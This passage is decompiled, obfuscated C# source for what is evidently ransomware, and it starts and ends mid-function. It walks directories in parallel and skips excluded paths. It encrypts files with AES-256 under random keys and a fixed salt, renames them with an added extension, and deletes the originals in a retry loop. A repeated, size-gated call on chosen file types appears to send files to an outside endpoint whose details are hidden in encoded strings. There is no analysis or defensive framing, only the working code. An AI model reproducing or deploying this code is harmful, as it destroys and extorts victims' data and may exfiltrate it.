															ApOKuNWkxqSR.IxYjJLTMXDzuQu(mBAKpdaxgGIiSOo.SOFrgJGetW.getString_0(107400743), mBAKpdaxgGIiSOo.SOFrgJGetW.getString_0(107400710), mBAKpdaxgGIiSOo.SOFrgJGetW.getString_0(107400733), CS_0024_003C_003E8__locals0.ksQXTBTzfiDke);
														}
														catch
														{
														}
													}
												}
												else if (CS_0024_003C_003E8__locals0.ksQXTBTzfiDke.ToLower().EndsWith(item2) && qIWeOYgtZSNt == mBAKpdaxgGIiSOo.SOFrgJGetW.getString_0(107396436))
												{
													try
													{
														ApOKuNWkxqSR.IxYjJLTMXDzuQu(mBAKpdaxgGIiSOo.SOFrgJGetW.getString_0(107400743), mBAKpdaxgGIiSOo.SOFrgJGetW.getString_0(107400710), mBAKpdaxgGIiSOo.SOFrgJGetW.getString_0(107400733), CS_0024_003C_003E8__locals0.ksQXTBTzfiDke);
													}
													catch
													{
													}
												}
											}
										});
										thread2.Priority = ThreadPriority.Normal;
										thread2.IsBackground = false;
										thread2.Start();
									}
									string text3 = rhRZQFaGAKbw.cSyqTamvZn(32);
									string s3 = PmmjrDLLHGk.kPAAXvpwzUaT(text3);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (yOzezPMztSZ == mBAKpdaxgGIiSOo.getString_0(107396433))
									{
										byte[] array2 = null;
										byte[] byte_2 = WZCHsryCBLJ.gsYSnbeqzsbU(CS_0024_003C_003E8__locals0.ksQXTBTzfiDke, Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024);
										WZCHsryCBLJ.MGSLxQyqoUi(qznoWitgOpFxI: (!flMhwZmYRAGAlC) ? (tRSKQaCWVf ? WZCHsryCBLJ.UMjuORBkcFPFXB(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WZCHsryCBLJ.UMjuORBkcFPFXB(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sQDDlGRIPwQjFTV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (tRSKQaCWVf ? pPEEddGAotfD.hHvJemuiMqqBLp(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pPEEddGAotfD.hHvJemuiMqqBLp(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sQDDlGRIPwQjFTV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZSIfqWNKFN: CS_0024_003C_003E8__locals0.ksQXTBTzfiDke, kLphRdsGImxW: bytes3);
									}
									else if (!tRSKQaCWVf)
									{
										rtnpCOxUAdvUXHj.sKqjBFIZxTw(CS_0024_003C_003E8__locals0.ksQXTBTzfiDke, nnEkTZqriSbg, CS_0024_003C_003E8__locals0.sQDDlGRIPwQjFTV);
									}
									else
									{
										rtnpCOxUAdvUXHj.sKqjBFIZxTw(CS_0024_003C_003E8__locals0.ksQXTBTzfiDke, nnEkTZqriSbg, text3, bytes3);
									}
								}
								else
								{
									string text4 = rhRZQFaGAKbw.cSyqTamvZn(32);
									string s4 = PmmjrDLLHGk.kPAAXvpwzUaT(text4);
									byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
									if (CS_0024_003C_003E8__locals0.RhFnHiViAutuY != mBAKpdaxgGIiSOo.getString_0(107363391))
									{
										if (!YMlgZeoTozpwYHf)
										{
											if (!tRSKQaCWVf)
											{
												QFFhZSkATgYb(item, item + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, rSFrHwQLaPb);
											}
											else
											{
												QFFhZSkATgYb(item, item + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, Encoding.ASCII.GetBytes(text4));
											}
										}
										else
										{
											try
											{
												if (!tRSKQaCWVf)
												{
													nhFkvndgnMEoAU(item, item + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, rSFrHwQLaPb);
												}
												else
												{
													nhFkvndgnMEoAU(item, item + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, Encoding.ASCII.GetBytes(text4));
												}
											}
											catch (Exception ex16)
											{
												if (nCZIbbbLUfspycLk)
												{
													try
													{
														File.AppendAllText(VjgrxEUFvvHY, mBAKpdaxgGIiSOo.getString_0(107363153) + item + mBAKpdaxgGIiSOo.getString_0(107363409) + ex16.Message + mBAKpdaxgGIiSOo.getString_0(107396285));
													}
													catch (Exception)
													{
													}
												}
											}
										}
									}
									else if (!YMlgZeoTozpwYHf)
									{
										if (!tRSKQaCWVf)
										{
											QFFhZSkATgYb(item, item + mBAKpdaxgGIiSOo.getString_0(107363418), rSFrHwQLaPb);
										}
										else
										{
											QFFhZSkATgYb(item, item + mBAKpdaxgGIiSOo.getString_0(107363418), Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!tRSKQaCWVf)
											{
												nhFkvndgnMEoAU(item, item, rSFrHwQLaPb);
											}
											else
											{
												nhFkvndgnMEoAU(item, item, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex18)
										{
											if (nCZIbbbLUfspycLk)
											{
												try
												{
													File.AppendAllText(VjgrxEUFvvHY, mBAKpdaxgGIiSOo.getString_0(107363153) + item + mBAKpdaxgGIiSOo.getString_0(107363409) + ex18.Message + mBAKpdaxgGIiSOo.getString_0(107396285));
												}
												catch (Exception)
												{
												}
											}
										}
									}
									if (tRSKQaCWVf)
									{
										if (CS_0024_003C_003E8__locals0.RhFnHiViAutuY != mBAKpdaxgGIiSOo.getString_0(107363391))
										{
											jPPfleEdfBACeW(item + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, bytes4);
										}
										else
										{
											jPPfleEdfBACeW(item, bytes4);
										}
									}
								}
								goto IL_0b4a;
								end_IL_0518_2:;
							}
							catch (Exception)
							{
								goto IL_0b4a;
							}
						}
					}
					continue;
					IL_0b4a:
					CS_0024_003C_003E8__locals0.WvtPVeZAyOd.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.WvtPVeZAyOd, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new mBAKpdaxgGIiSOo.ApqFwhdfUUGrS();
			CS_0024_003C_003E8__locals0.oFTrErWbhZo = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK = string_0;
			if (!CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107400143)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107400118)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107400085)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399524)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399543)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399486)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399465)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399480)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399467)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399398)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399389)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399404)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399378)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399325)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399300)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399315)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399778)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399793)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399744)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399759)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399710)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399725)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399680)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399691)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399646)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399665)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399616)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(mBAKpdaxgGIiSOo.getString_0(107399631)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(AJakXHzLGH(mBAKpdaxgGIiSOo.getString_0(107399582))) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399557)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399576)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(CS_0024_003C_003E8__locals0.RhFnHiViAutuY) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(mBAKpdaxgGIiSOo.getString_0(107399007)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(mBAKpdaxgGIiSOo.getString_0(107399034)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(mBAKpdaxgGIiSOo.getString_0(107399029)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(mBAKpdaxgGIiSOo.getString_0(107399024)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(mBAKpdaxgGIiSOo.getString_0(107399019)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(UCnmTIRKyzLvN) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(VjgrxEUFvvHY) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(jUdQCPAqaGpC))
			{
				if (CS_0024_003C_003E8__locals0.ohFsjVpBGxFMK.Length != 0)
				{
					string[] ohFsjVpBGxFMK = CS_0024_003C_003E8__locals0.ohFsjVpBGxFMK;
					int num = 0;
					while (num < ohFsjVpBGxFMK.Length)
					{
						string value = ohFsjVpBGxFMK[num];
						if (!CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0cc3;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(CS_0024_003C_003E8__locals0.RhFnHiViAutuY))
					{
						goto IL_0cc3;
					}
				}
				catch (Exception)
				{
					goto IL_0cc3;
				}
				if (!meZsVdOPaL.Contains(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK))
				{
					if (hEqjITdFNHN == mBAKpdaxgGIiSOo.getString_0(107396976))
					{
						try
						{
							if (cTRLNsgdQpdHDjH.IwGNMUOZCbK(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK))
							{
								cTRLNsgdQpdHDjH.QJiNPENvLKcP(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
							}
						}
						catch
						{
						}
					}
					meZsVdOPaL.Add(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
					if (!XMwazMiiElRCF.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK)))
					{
						XMwazMiiElRCF.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK));
					}
					ZTSNWrphNXPrPP(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK).Length != 0L)
							{
								goto end_IL_0636;
							}
							goto end_IL_0636_2;
							end_IL_0636:;
						}
						catch (Exception ex2)
						{
							if (nCZIbbbLUfspycLk)
							{
								try
								{
									File.AppendAllText(VjgrxEUFvvHY, mBAKpdaxgGIiSOo.getString_0(107363153) + CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + mBAKpdaxgGIiSOo.getString_0(107380357) + ex2.Message + mBAKpdaxgGIiSOo.getString_0(107396285));
								}
								catch (Exception)
								{
								}
							}
							goto end_IL_0636_2;
						}
						if (IIzcsAXxpCcBT == mBAKpdaxgGIiSOo.getString_0(107396976) && new FileInfo(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK).Length > Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.RhFnHiViAutuY != mBAKpdaxgGIiSOo.getString_0(107363391))
								{
									File.Move(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + CS_0024_003C_003E8__locals0.RhFnHiViAutuY);
								}
							}
							catch (Exception ex4)
							{
								if (nCZIbbbLUfspycLk)
								{
									try
									{
										File.AppendAllText(VjgrxEUFvvHY, mBAKpdaxgGIiSOo.getString_0(107363153) + CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + mBAKpdaxgGIiSOo.getString_0(107380808) + ex4.Message + mBAKpdaxgGIiSOo.getString_0(107396285));
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
								return;
							}
							if (CS_0024_003C_003E8__locals0.RhFnHiViAutuY != mBAKpdaxgGIiSOo.getString_0(107363391))
							{
								CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK += CS_0024_003C_003E8__locals0.RhFnHiViAutuY;
							}
							if (PFlwcndeNzM == mBAKpdaxgGIiSOo.getString_0(107396976))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in YEHhRPAlgeTZv)
									{
										if (CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.oFTrErWbhZo.RhFnHiViAutuY) && qIWeOYgtZSNt == mBAKpdaxgGIiSOo.ApqFwhdfUUGrS.getString_0(107396982))
										{
											if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK).Length)
											{
												try
												{
													ApOKuNWkxqSR.IxYjJLTMXDzuQu(mBAKpdaxgGIiSOo.ApqFwhdfUUGrS.getString_0(107400746), mBAKpdaxgGIiSOo.ApqFwhdfUUGrS.getString_0(107400713), mBAKpdaxgGIiSOo.ApqFwhdfUUGrS.getString_0(107400736), CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().EndsWith(item3) && qIWeOYgtZSNt == mBAKpdaxgGIiSOo.ApqFwhdfUUGrS.getString_0(107396439))
										{
											try
											{
												ApOKuNWkxqSR.IxYjJLTMXDzuQu(mBAKpdaxgGIiSOo.ApqFwhdfUUGrS.getString_0(107400746), mBAKpdaxgGIiSOo.ApqFwhdfUUGrS.getString_0(107400713), mBAKpdaxgGIiSOo.ApqFwhdfUUGrS.getString_0(107400736), CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = rhRZQFaGAKbw.cSyqTamvZn(32);
							string s = PmmjrDLLHGk.kPAAXvpwzUaT(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (yOzezPMztSZ == mBAKpdaxgGIiSOo.getString_0(107396433))
							{
								byte[] array = null;
								byte[] byte_ = WZCHsryCBLJ.gsYSnbeqzsbU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024);
								WZCHsryCBLJ.MGSLxQyqoUi(qznoWitgOpFxI: (!flMhwZmYRAGAlC) ? (tRSKQaCWVf ? WZCHsryCBLJ.UMjuORBkcFPFXB(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WZCHsryCBLJ.UMjuORBkcFPFXB(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sQDDlGRIPwQjFTV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (tRSKQaCWVf ? pPEEddGAotfD.hHvJemuiMqqBLp(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pPEEddGAotfD.hHvJemuiMqqBLp(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sQDDlGRIPwQjFTV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZSIfqWNKFN: CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, kLphRdsGImxW: bytes);
							}
							else if (!tRSKQaCWVf)
							{
								rtnpCOxUAdvUXHj.sKqjBFIZxTw(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, nnEkTZqriSbg, CS_0024_003C_003E8__locals0.sQDDlGRIPwQjFTV);
							}
							else
							{
								rtnpCOxUAdvUXHj.sKqjBFIZxTw(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, nnEkTZqriSbg, text, bytes);
							}
						}
						else
						{
							string text2 = rhRZQFaGAKbw.cSyqTamvZn(32);
							string s2 = PmmjrDLLHGk.kPAAXvpwzUaT(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.RhFnHiViAutuY != mBAKpdaxgGIiSOo.getString_0(107363391))
							{
								if (!YMlgZeoTozpwYHf)
								{
									if (!tRSKQaCWVf)
									{
										QFFhZSkATgYb(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, rSFrHwQLaPb);
									}
									else
									{
										QFFhZSkATgYb(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!tRSKQaCWVf)
										{
											nhFkvndgnMEoAU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, rSFrHwQLaPb);
										}
										else
										{
											nhFkvndgnMEoAU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (nCZIbbbLUfspycLk)
										{
											try
											{
												File.AppendAllText(VjgrxEUFvvHY, mBAKpdaxgGIiSOo.getString_0(107363153) + CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + mBAKpdaxgGIiSOo.getString_0(107363409) + ex6.Message + mBAKpdaxgGIiSOo.getString_0(107396285));
											}
											catch (Exception)
											{
											}
										}
									}
								}
							}
							else if (!YMlgZeoTozpwYHf)
							{
								if (!tRSKQaCWVf)
								{
									QFFhZSkATgYb(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + mBAKpdaxgGIiSOo.getString_0(107363418), rSFrHwQLaPb);
								}
								else
								{
									QFFhZSkATgYb(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + mBAKpdaxgGIiSOo.getString_0(107363418), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!tRSKQaCWVf)
									{
										nhFkvndgnMEoAU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, rSFrHwQLaPb);
									}
									else
									{
										nhFkvndgnMEoAU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (nCZIbbbLUfspycLk)
									{
										try
										{
											File.AppendAllText(VjgrxEUFvvHY, mBAKpdaxgGIiSOo.getString_0(107363153) + CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + mBAKpdaxgGIiSOo.getString_0(107363409) + ex8.Message + mBAKpdaxgGIiSOo.getString_0(107396285));
										}
										catch (Exception)
										{
										}
									}
								}
							}
							if (tRSKQaCWVf)
							{
								if (CS_0024_003C_003E8__locals0.RhFnHiViAutuY != mBAKpdaxgGIiSOo.getString_0(107363391))
								{
									jPPfleEdfBACeW(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + CS_0024_003C_003E8__locals0.RhFnHiViAutuY, bytes2);
								}
								else
								{
									jPPfleEdfBACeW(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, bytes2);
								}
							}
						}
						end_IL_0636_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0cc3;
			IL_0cc3:
			CS_0024_003C_003E8__locals0.WvtPVeZAyOd.Remove(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
		});
	}

	private static void KHTGEVGMyJo(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (PFlwcndeNzM == getString_0(107396958))
					{
						foreach (string item in YEHhRPAlgeTZv)
						{
							if (string_0.ToLower().EndsWith(item) && qIWeOYgtZSNt == getString_0(107396958))
							{
								if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400722), getString_0(107400689), getString_0(107400712), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && qIWeOYgtZSNt == getString_0(107396415))
							{
								try
								{
									ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400722), getString_0(107400689), getString_0(107400712), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107363400)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107363400), getString_0(107400641)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void nhFkvndgnMEoAU(string string_0, string string_1, byte[] byte_0)
	{
		if (PFlwcndeNzM == getString_0(107396958))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in YEHhRPAlgeTZv)
			{
				if (string_0.ToLower().EndsWith(item) && qIWeOYgtZSNt == getString_0(107396958))
				{
					if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400722), getString_0(107400689), getString_0(107400712), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && qIWeOYgtZSNt == getString_0(107396415))
				{
					try
					{
						ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400722), getString_0(107400689), getString_0(107400712), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = pPEEddGAotfD.hHvJemuiMqqBLp(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
		}
	}

	private static void QFFhZSkATgYb(string string_0, string string_1, byte[] byte_0)
	{
		OTINmDYCTwXpOZp CS_0024_003C_003E8__locals0 = new OTINmDYCTwXpOZp();
		CS_0024_003C_003E8__locals0.jJgeinqiNR = string_0;
		CS_0024_003C_003E8__locals0.RTzXFkgGql = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string rTzXFkgGql = CS_0024_003C_003E8__locals0.RTzXFkgGql;
			FileStream fileStream = new FileStream(rTzXFkgGql, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (kQqMJAvESmfL == getString_0(107396958))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.jJgeinqiNR, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.jJgeinqiNR, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.jJgeinqiNR, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.RTzXFkgGql.Length > 0)
				{
					if (PFlwcndeNzM == getString_0(107396958))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.jJgeinqiNR, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in YEHhRPAlgeTZv)
						{
							if (CS_0024_003C_003E8__locals0.jJgeinqiNR.ToLower().EndsWith(item) && qIWeOYgtZSNt == getString_0(107396958))
							{
								if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400722), getString_0(107400689), getString_0(107400712), CS_0024_003C_003E8__locals0.jJgeinqiNR);
									}
